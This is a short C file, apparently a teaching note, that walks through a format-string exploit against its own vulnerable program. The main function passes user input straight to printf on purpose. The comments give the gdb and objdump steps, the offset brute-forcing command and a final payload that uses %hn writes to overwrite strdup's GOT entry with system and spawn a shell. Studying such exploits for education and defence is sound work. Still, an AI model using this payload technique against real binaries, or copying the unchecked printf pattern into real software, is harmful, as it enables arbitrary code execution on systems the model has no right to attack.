# printf_exploit

<code>
//
// temp.c
//

#include <stdio.h>
#include <string.h>
// compile with gcc -m32 temp.c -o temp

// objdump -d temp
// find address of strdup@plt (first jmp)
// e.g. 0x80496f8

// disable libc randomization ulimit -s unlimited

// gdb -q temp
// find system lib address with:
// b main
// r
// p system

// split 4 byte hex into 2 2 bytes and convert from hex to int
// system is e.g. 0x4007c360
// we know we already wrote 12 bytes (sh;# = 4 bytes + 8 bytes for the address)
// 0xc360 - 12 = 50004
// and
// 0x4007 - 0xc360 = -33625 (we know we already wrote 0xc360 bytes but we have an overflow..)
// so we add an additional 1 to the 0x4007 and get -> 31911

// the two memory addresses where we write those two blocks:
// first one is clear 0x80496f8 (the address of the strdup() function)
// one block is 2 bytes wide so the second address is 0x80496f8 + 2 = 0x80496fa

// the offset can be found via bruteforce:
// env -i ./temp "$(python -c 'import sys; sys.stdout.write("sh;#AAAABBBB%00000x%17$hp%00000x%18$hp")')"

// the result has to be: sh;#AAAABBBB<garbabe>0x41414141<garbage>0x42424242 (41 for A, 42 for B)
// this gives us the offset from the input to the printf function on the stack e.g. 104, 105


// now we know to which addresses and offset we write which code:
// env -i ./temp "$(python -c 'import sys; sys.stdout.write("sh;#\xf8\x96\x04\x08\xfa\x96\x04\x08%50004x%104$hn%31911x%105$hn")')"


int main(int argc, char** argv) {
  printf(argv[1]);
  strdup(argv[1]);
}

</code>
